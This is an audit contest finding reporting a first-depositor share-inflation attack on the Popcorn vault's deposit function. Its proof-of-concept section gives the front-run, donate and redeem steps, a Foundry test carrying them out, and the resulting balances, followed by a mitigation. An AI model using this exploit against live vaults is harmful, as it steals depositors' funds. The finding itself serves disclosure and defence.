## Tags

- bug
- 3 (High Risk)
- primary issue
- selected for report
- sponsor confirmed
- H-10

# [First vault depositor can steal other's assets](https://github.com/code-423n4/2023-01-popcorn-findings/issues/243) 

# Lines of code

https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L294-L301


# Vulnerability details

## Impact
The first depositor can be front run by an attacker and as a result will lose a considerable part of the assets provided. 

The vault calculates the amount of shares to be minted upon deposit to every user via the `convertToShares()` function:

```solidity
function deposit(uint256 assets, address receiver)
    public
    nonReentrant
    whenNotPaused
    syncFeeCheckpoint
    returns (uint256 shares)
{
    if (receiver == address(0)) revert InvalidReceiver();

    uint256 feeShares = convertToShares(
        assets.mulDiv(uint256(fees.deposit), 1e18, Math.Rounding.Down)
    );

    shares = convertToShares(assets) - feeShares;

    if (feeShares > 0) _mint(feeRecipient, feeShares);

    _mint(receiver, shares);

    asset.safeTransferFrom(msg.sender, address(this), assets);

    adapter.deposit(assets, address(this));

    emit Deposit(msg.sender, receiver, assets, shares);
}

function convertToShares(uint256 assets) public view returns (uint256) {
    uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.

    return
        supply == 0
            ? assets
            : assets.mulDiv(supply, totalAssets(), Math.Rounding.Down);
}

```

When the pool has no share supply, the amount of shares to be minted is equal to the assets provided. An attacker can abuse of this situation and profit of the rounding down operation when calculating the amount of shares if the supply is non-zero. This attack is enabled by the following components: frontrunning, rounding down the amount of shares calculated and regular ERC20 transfers.

## Proof of Concept
The Vault charges zero fees to conduct any action.

- Alice wants to deposit 2MM USDT to a vault.
- Bob frontruns Alice deposit() call with the following transactions:
  - `vault.deposit(1, bob)`: This gives Bob 1 share backed by 1 USDT.
  - `usdt.transfer(address(vault.adapter()), 1MM)`: Sends 1MM USDT to the underlying vault's adapter (from were the `totalAssets` are calculated)
  - After those two transactions, `totalAssets = 1MM + 1` and `totalSupply = 1`.
- Alice deposit transaction is mined: `deposit(2MM, alice)`, she receives only **one** share because: 
  - 2MM / (1MM + 1) * totalSupply = 2MM / (1MM + 1) * 1 = 2MM / (1MM+) ≈ 1.999998 = 1 (as Solidity floors down).
- After Alice tx, the pool now has 3MM assets and distributed 2 shares.
- Bob backruns Alice transaction and redeems his share getting 3MM * (1 Share Owned by Bob) / (2 total shares) = 1.5MM

This process gives Bob a ≈500k asset profit and Alice incurs in a ≈500k loss:

```solidity
  function test__FirstDepositorFrontRun() public {
    uint256 amount = 2_000_000 ether;

    uint256 aliceassetAmount = amount;

    asset.mint(bob, aliceassetAmount);
    asset.mint(alice, aliceassetAmount);

    vm.prank(alice);
    asset.approve(address(vault), aliceassetAmount);
    assertEq(asset.allowance(alice, address(vault)), aliceassetAmount);

    vm.prank(bob);
    asset.approve(address(vault), aliceassetAmount);
    assertEq(asset.allowance(bob, address(vault)), aliceassetAmount);

    uint256 alicePreDepositBal = asset.balanceOf(alice);

    console.log("\n=== INITIAL STATES ===");
    console.log("Bob assets: %s", asset.balanceOf(bob));
    console.log("Alice assets: %s", alicePreDepositBal);

    // Bob frontruns Alice deposit.
    vm.startPrank(bob);
    uint256 bobShareAmount = vault.deposit(1, bob);
    console.log("\n=== BOB DEPOSITS ===");
    console.log("Bob Shares Amount: %s", bobShareAmount);
    console.log("Vault Assets : %s", vault.totalAssets());

    assertTrue(bobShareAmount == 1);
    assertTrue(vault.totalAssets() == 1);
    assertEq(adapter.afterDepositHookCalledCounter(), 1);

    // Bob transfers 1MM of tokens to the adapter
    asset.transfer(address(vault.adapter()), 1_000_000 ether);
    console.log("\n=== AFTER BOB's TRANSFER ===");
    console.log("Bob Shares Amount: %s", bobShareAmount);
    console.log("Vault Assets : %s", vault.totalAssets());
    assertTrue(vault.totalAssets() == 1_000_000 ether + 1);
    vm.stopPrank();

    
    // Alice Txn is mined
    vm.prank(alice);
    uint256 aliceShareAmount = vault.deposit(aliceassetAmount, alice);
    console.log("\n=== AFTER ALICE TX ===");
    console.log("Alice Shares Amount: %s", aliceShareAmount);
    console.log("Vault Assets : %s", vault.totalAssets());
    assertTrue(aliceShareAmount == 1);

    console.log("Convertable assets that Bob receives: %s", vault.convertToAssets(vault.balanceOf(bob)));
    console.log("Convertable assets that Alice receives: %s", vault.convertToAssets(vault.balanceOf(bob)));

    // Bob backruns the call and gets a 500k profit
    vm.prank(bob);
    vault.redeem(bobShareAmount, bob, bob);
    console.log("\n=== BOB WITHDRAWS ===");

    console.log("\n=== ALICE WITHDRAWS ===");
    vm.prank(alice);
    vault.redeem(aliceShareAmount, alice, alice);

    console.log("\n=== FINAL STATES ===");
    console.log("Bob assets: %s", asset.balanceOf(bob));
    console.log("Alice assets: %s", asset.balanceOf(alice));
  }
```

Output:

```
=== INITIAL STATES ===
  Bob assets: 2000000000000000000000000
  Alice assets: 2000000000000000000000000
  
=== BOB DEPOSITS ===
  Bob Shares Amount: 1
  Vault Assets : 1

=== AFTER BOB's TRANSFER ===
  Bob Shares Amount: 1
  Vault Assets : 1000000000000000000000001
  
=== AFTER ALICE TX ===
  Alice Shares Amount: 1
  Vault Assets : 3000000000000000000000001
  Convertable assets that Bob receives: 1500000000000000000000000
  Convertable assets that Alice receives: 1500000000000000000000000
  
=== BOB WITHDRAWS ===
  
=== ALICE WITHDRAWS ===
  
=== FINAL STATES ===
  Bob assets: 2499999999999999999999999
  Alice assets: 1500000000000000000000001
```

This same issue is commonly found in vaults, [Spearbit](https://spearbit.com/) also [reported this](https://github.com/spearbit/portfolio/blob/master/pdfs/MapleV2.pdf) on their Maple V2 audit as the primary high risk issue. 

## Tools Used
Manual Review

## Recommended Mitigation Steps
- Require a minimum amount of initial shares (when its supply is zero) to be minted taking into account that:
  - The deposit mints an effective (INITIAL_MINT - INITIAL_BURN) amount of shares to the first depositor
  - Burns the INITIAL_BURN amount to a dead address.

Both initial amounts should be set carefully as they partially harm the first depositor. Those amounts should be high enough to reduce the profitability of this attack to the first depositor but not excessively high which could reduce the incentive of being the first depositor. 